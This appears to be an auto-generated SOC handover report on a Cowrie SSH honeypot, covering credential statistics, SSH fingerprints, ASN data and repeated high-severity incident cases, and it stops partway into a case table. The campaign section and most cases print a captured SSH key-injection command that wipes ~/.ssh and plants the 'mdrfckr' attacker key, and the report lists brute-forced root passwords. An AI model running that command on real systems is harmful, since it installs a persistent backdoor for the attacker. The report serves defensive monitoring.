# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T16:47:35Z |
| **Shift Time** | 16:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **86** |
| Confirmed Threats | **68** |
| False Positives Filtered | **18** (20.9%) |
| Unique Attacker IPs | **9** |
| Countries of Origin | **8** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **61** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **50** |
| Unique Credential Pairs | **28** |
| Unique Usernames | **15** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 12 |
| `admin` | 1 |
| `ali` | 1 |
| `sammy` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `123456` | 2 |
| `admin!@#` | 1 |
| `ASDFqwer1234` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `admin` | `admin!@#` | 1 |
| `root` | `ASDFqwer1234` | 1 |
| `ali` | `222222` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ASDFqwer1234` | `154.221.27.234` | 2026-04-19T15:24:35 |
| `root` | `3245gs5662d34` | `154.221.27.234` | 2026-04-19T15:24:38 |
| `root` | `qazwsx111!` | `154.221.27.234` | 2026-04-19T15:28:06 |
| `root` | `ZAQ!#$` | `154.221.27.234` | 2026-04-19T15:29:46 |
| `root` | `1q2w3e4r@` | `154.221.27.234` | 2026-04-19T15:31:21 |
| `root` | `Mh123456` | `154.221.27.234` | 2026-04-19T15:32:57 |
| `root` | `root123456789$` | `154.221.27.234` | 2026-04-19T15:34:33 |
| `root` | `12345@asdf` | `154.221.27.234` | 2026-04-19T15:36:09 |
| `root` | `Qazwsx2022!@` | `154.221.27.234` | 2026-04-19T15:41:10 |
| `root` | `Qazwsx111@#` | `154.221.27.234` | 2026-04-19T15:46:02 |
| `root` | `asdf.1234` | `154.221.27.234` | 2026-04-19T15:47:37 |
| `root` | `---fuck_you----` | `101.42.26.23` | 2026-04-19T15:51:39 |
| `root` | `Root30!` | `154.221.27.234` | 2026-04-19T15:55:40 |
| `root` | `rocky` | `154.221.27.234` | 2026-04-19T16:00:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **86** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 49 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 49 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `154.221.27.234`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **9** |
| Unique ASNs | **9** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS142403` | YISU CLOUD LTD | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS137120` | Nas Internet Services Private Limited | 1 | LOW |
| `AS12091` | MTN SA | 1 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-077ce245c224

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:24 |
| **Last Seen** | 2026-04-19 15:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:24:34` | `cowrie.session.connect` |
| `2026-04-19 15:24:34` | `cowrie.client.version` |
| `2026-04-19 15:24:34` | `cowrie.client.kex` |
| `2026-04-19 15:24:35` | `cowrie.login.success` |
| `2026-04-19 15:24:35` | `cowrie.session.params` |
| `2026-04-19 15:24:35` | `cowrie.command.input` |
| `2026-04-19 15:24:35` | `cowrie.command.failed` |
| `2026-04-19 15:24:35` | `cowrie.log.closed` |
| `2026-04-19 15:24:35` | `cowrie.session.params` |
| `2026-04-19 15:24:35` | `cowrie.command.input` |
| `2026-04-19 15:24:35` | `cowrie.session.file_download` |
| `2026-04-19 15:24:35` | `cowrie.log.closed` |
| `2026-04-19 15:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0937e21e1c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:24 |
| **Last Seen** | 2026-04-19 15:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:24:37` | `cowrie.session.connect` |
| `2026-04-19 15:24:37` | `cowrie.client.version` |
| `2026-04-19 15:24:37` | `cowrie.client.kex` |
| `2026-04-19 15:24:38` | `cowrie.login.success` |
| `2026-04-19 15:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcc2b9c563d

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:28 |
| **Last Seen** | 2026-04-19 15:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:28:05` | `cowrie.session.connect` |
| `2026-04-19 15:28:05` | `cowrie.client.version` |
| `2026-04-19 15:28:05` | `cowrie.client.kex` |
| `2026-04-19 15:28:06` | `cowrie.login.success` |
| `2026-04-19 15:28:06` | `cowrie.session.params` |
| `2026-04-19 15:28:06` | `cowrie.command.input` |
| `2026-04-19 15:28:06` | `cowrie.command.failed` |
| `2026-04-19 15:28:06` | `cowrie.log.closed` |
| `2026-04-19 15:28:06` | `cowrie.session.params` |
| `2026-04-19 15:28:06` | `cowrie.command.input` |
| `2026-04-19 15:28:07` | `cowrie.session.file_download` |
| `2026-04-19 15:28:07` | `cowrie.log.closed` |
| `2026-04-19 15:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56e123b7fc1

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:28 |
| **Last Seen** | 2026-04-19 15:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:28:08` | `cowrie.session.connect` |
| `2026-04-19 15:28:08` | `cowrie.client.version` |
| `2026-04-19 15:28:08` | `cowrie.client.kex` |
| `2026-04-19 15:28:09` | `cowrie.login.success` |
| `2026-04-19 15:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a412053579c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:29 |
| **Last Seen** | 2026-04-19 15:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:29:45` | `cowrie.session.connect` |
| `2026-04-19 15:29:45` | `cowrie.client.version` |
| `2026-04-19 15:29:46` | `cowrie.client.kex` |
| `2026-04-19 15:29:46` | `cowrie.login.success` |
| `2026-04-19 15:29:46` | `cowrie.session.params` |
| `2026-04-19 15:29:46` | `cowrie.command.input` |
| `2026-04-19 15:29:46` | `cowrie.command.failed` |
| `2026-04-19 15:29:46` | `cowrie.log.closed` |
| `2026-04-19 15:29:47` | `cowrie.session.params` |
| `2026-04-19 15:29:47` | `cowrie.command.input` |
| `2026-04-19 15:29:47` | `cowrie.session.file_download` |
| `2026-04-19 15:29:47` | `cowrie.log.closed` |
| `2026-04-19 15:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce5fa579f8b

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:29 |
| **Last Seen** | 2026-04-19 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:29:49` | `cowrie.session.connect` |
| `2026-04-19 15:29:49` | `cowrie.client.version` |
| `2026-04-19 15:29:49` | `cowrie.client.kex` |
| `2026-04-19 15:29:49` | `cowrie.login.success` |
| `2026-04-19 15:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb54e9cad73

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:31 |
| **Last Seen** | 2026-04-19 15:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:31:21` | `cowrie.session.connect` |
| `2026-04-19 15:31:21` | `cowrie.client.version` |
| `2026-04-19 15:31:21` | `cowrie.client.kex` |
| `2026-04-19 15:31:21` | `cowrie.login.success` |
| `2026-04-19 15:31:22` | `cowrie.session.params` |
| `2026-04-19 15:31:22` | `cowrie.command.input` |
| `2026-04-19 15:31:22` | `cowrie.command.failed` |
| `2026-04-19 15:31:22` | `cowrie.log.closed` |
| `2026-04-19 15:31:22` | `cowrie.session.params` |
| `2026-04-19 15:31:22` | `cowrie.command.input` |
| `2026-04-19 15:31:22` | `cowrie.session.file_download` |
| `2026-04-19 15:31:22` | `cowrie.log.closed` |
| `2026-04-19 15:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed6a7b9a917

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:31 |
| **Last Seen** | 2026-04-19 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:31:24` | `cowrie.session.connect` |
| `2026-04-19 15:31:24` | `cowrie.client.version` |
| `2026-04-19 15:31:24` | `cowrie.client.kex` |
| `2026-04-19 15:31:24` | `cowrie.login.success` |
| `2026-04-19 15:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660b018dd19f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:32 |
| **Last Seen** | 2026-04-19 15:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:32:57` | `cowrie.session.connect` |
| `2026-04-19 15:32:57` | `cowrie.client.version` |
| `2026-04-19 15:32:57` | `cowrie.client.kex` |
| `2026-04-19 15:32:57` | `cowrie.login.success` |
| `2026-04-19 15:32:58` | `cowrie.session.params` |
| `2026-04-19 15:32:58` | `cowrie.command.input` |
| `2026-04-19 15:32:58` | `cowrie.command.failed` |
| `2026-04-19 15:32:58` | `cowrie.log.closed` |
| `2026-04-19 15:32:58` | `cowrie.session.params` |
| `2026-04-19 15:32:58` | `cowrie.command.input` |
| `2026-04-19 15:32:58` | `cowrie.session.file_download` |
| `2026-04-19 15:32:58` | `cowrie.log.closed` |
| `2026-04-19 15:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c33de45d82

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:33 |
| **Last Seen** | 2026-04-19 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:33:00` | `cowrie.session.connect` |
| `2026-04-19 15:33:00` | `cowrie.client.version` |
| `2026-04-19 15:33:01` | `cowrie.client.kex` |
| `2026-04-19 15:33:01` | `cowrie.login.success` |
| `2026-04-19 15:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6675d4e9ac

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:34 |
| **Last Seen** | 2026-04-19 15:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:34:32` | `cowrie.session.connect` |
| `2026-04-19 15:34:32` | `cowrie.client.version` |
| `2026-04-19 15:34:32` | `cowrie.client.kex` |
| `2026-04-19 15:34:33` | `cowrie.login.success` |
| `2026-04-19 15:34:33` | `cowrie.session.params` |
| `2026-04-19 15:34:33` | `cowrie.command.input` |
| `2026-04-19 15:34:33` | `cowrie.command.failed` |
| `2026-04-19 15:34:33` | `cowrie.log.closed` |
| `2026-04-19 15:34:33` | `cowrie.session.params` |
| `2026-04-19 15:34:33` | `cowrie.command.input` |
| `2026-04-19 15:34:34` | `cowrie.session.file_download` |
| `2026-04-19 15:34:34` | `cowrie.log.closed` |
| `2026-04-19 15:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0231ad9880fe

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:34 |
| **Last Seen** | 2026-04-19 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:34:35` | `cowrie.session.connect` |
| `2026-04-19 15:34:35` | `cowrie.client.version` |
| `2026-04-19 15:34:35` | `cowrie.client.kex` |
| `2026-04-19 15:34:36` | `cowrie.login.success` |
| `2026-04-19 15:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2276c392b84f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:36 |
| **Last Seen** | 2026-04-19 15:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:36:08` | `cowrie.session.connect` |
| `2026-04-19 15:36:08` | `cowrie.client.version` |
| `2026-04-19 15:36:08` | `cowrie.client.kex` |
| `2026-04-19 15:36:09` | `cowrie.login.success` |
| `2026-04-19 15:36:09` | `cowrie.session.params` |
| `2026-04-19 15:36:09` | `cowrie.command.input` |
| `2026-04-19 15:36:09` | `cowrie.command.failed` |
| `2026-04-19 15:36:09` | `cowrie.log.closed` |
| `2026-04-19 15:36:09` | `cowrie.session.params` |
| `2026-04-19 15:36:09` | `cowrie.command.input` |
| `2026-04-19 15:36:09` | `cowrie.session.file_download` |
| `2026-04-19 15:36:09` | `cowrie.log.closed` |
| `2026-04-19 15:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0e08c13f7b

| Field | Detail |
|---|---|
